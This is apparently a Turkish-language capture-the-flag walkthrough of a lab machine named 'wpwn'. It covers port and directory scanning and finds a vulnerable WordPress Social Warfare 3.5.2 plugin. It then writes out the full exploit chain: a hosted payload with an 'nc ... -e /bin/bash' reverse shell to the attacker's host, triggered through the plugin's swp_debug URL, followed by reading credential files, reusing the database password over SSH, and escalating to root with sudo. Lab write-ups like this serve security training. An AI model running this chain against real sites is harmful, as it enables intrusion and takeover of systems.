@@ -1,0 +1,131 @@
+      ####Enumeration
+
+Nmap
+Bir tarama çalıştırarak başlıyoruz :
+kali@kali:~$ sudo nmap $targetip     
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 08:34 EST
+Nmap scan report for $targetip
+Host is up (0.039s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+      ####Gubuster
+Bir web tarayıcısında 80 numaralı bağlantı noktasına gitmek, herhangi bir kullanım göstermez, ancak gobuster web sitesinin gizli dizinlerini bruteforce için kullanabiliriz.
+kali@kali:~$ gobuster dir -u http://$targetip -w /usr/share/wordlists/dirb/small.txt -z
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+...
+/wordpress (Status: 301)
+...
+/wordpress dizininde çalışan bir Wordpress sitesi var gibi görünüyor .
+
+      ####WPS taraması
+Muhtemel Wordpress sitesinin varlığı göz önüne alındığında, wps numaralandırmak için kullanalım:
+kali@kali:~$ wpscan --url http://$targetip/wordpress -e ap
+...
+[i] Plugin(s) Identified:
+
+[+] social-warfare
+ | Location: http://$targetip/wordpress/wp-content/plugins/social-warfare/
+ | Last Updated: 2020-12-07T20:39:00.000Z
+ | [!] The version is out of date, the latest version is 4.2.1
+ |
+ | Found By: Comment (Passive Detection)
+ |
+ | Version: 3.5.2 (100% confidence)
+ | Found By: Comment (Passive Detection)
+ |  - http://$targetip/wordpress/, Match: 'Social Warfare v3.5.2'
+ | Confirmed By:
+ |  Readme - Stable Tag (Aggressive Detection)
+ |   - http://$targetip/wordpress/wp-content/plugins/social-warfare/readme.txt
+ |  Readme - ChangeLog Section (Aggressive Detection)
+ |   - http://$targetip/wordpress/wp-content/plugins/social-warfare/readme.txt
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
+...
+Taramamız, Wordpress eklentisinin social-warfare3.5.2 sürümünün kurulu olduğunu gösteriyor. Eklentinin bu sürümü, uzaktan kod yürütme güvenlik açığından muzdarip.
+
+      ####Exploitation
+
+      ####Uzaktan Kod Yürütme
+Bu eklentinin kullanımını araştırdıktan sonra, RCE'yi aşağıdaki gibi elde edebiliriz. Öncelikle payloadumuzu oluşturalım:
+kali@kali:~$ cat shell.txt                                                   
+<pre>system('nc $attackerip 4444 -e /bin/bash')</pre>
+HTTP üzerinden saldıran makinemizde barındırıyoruz:
+kali@kali:~$ sudo python3 -m http.server 80                       
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+...
+Ardından 4444 numaralı bağlantı noktasında bir dinleyici kurarız ve indirmek ve çalıştırmak için http://$targetip/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$attackerip/shell.txt adresini ziyaret ederiz.
+yükümüz ve ters bir kabuk geri alın:
+kali@kali:~$ nc -lvp 4444              
+listening on [any] 4444 ...
+$targetip: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 33712
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@wpwn:/var/www/html/wordpress/wp-admin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@wpwn:/var/www/html/wordpress/wp-admin$
+
+      ####Kullanıcı Parolasının Yeniden Kullanımı
+Bu sistemdeki kullanıcıları numaralandırmak, kullanıcıyı gösterir --> takis:
+www-data@wpwn:/var/www/html/wordpress/wp-admin$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/bin/python2.7
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+takis:x:1000:1000:takis,,,:/home/takis:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
+Wordpress yapılandırma dosyasını kontrol edersek, aşağıdaki veritabanı şifresini buluruz:
+www-data@wpwn:/var/www/html/wordpress/wp-admin$ cat ../wp-config.php
+cat ../wp-config.php
+<?php
+...
+/** MySQL database password */
+define( 'DB_PASSWORD', '$passwordcensored' );
+...
+Bu şifrenin kullanıcı için tekrar kullanılıp kullanılmadığını kontrol edelim. 22 numaralı bağlantı noktasının açık olduğunu görünce, makineye username: takis şifre: $passwordcensored ile olduğu gibi SSH'yi deneyebiliriz:
+kali@kali:~$ ssh -o StrictHostKeyChecking=no takis@$targetip
+...
+takis@wpwn:~$ id
+uid=1000(takis) gid=1000(takis) groups=1000(takis),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+sudo
+Sudo ile hangi komutları çalıştırabileceğimizi kontrol etmek, izinlerin tamamen açık olduğunu gösterir:
+takis@wpwn:~$ sudo -l
+Matching Defaults entries for takis on wpwn:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User takis may run the following commands on wpwn:
+    (ALL) NOPASSWD: ALL
+Aşağıdaki gibi çok kolay bir şekilde root olabiliriz:
+takis@wpwn:~$ sudo su
+root@wpwn:/home/takis# whoami
+root
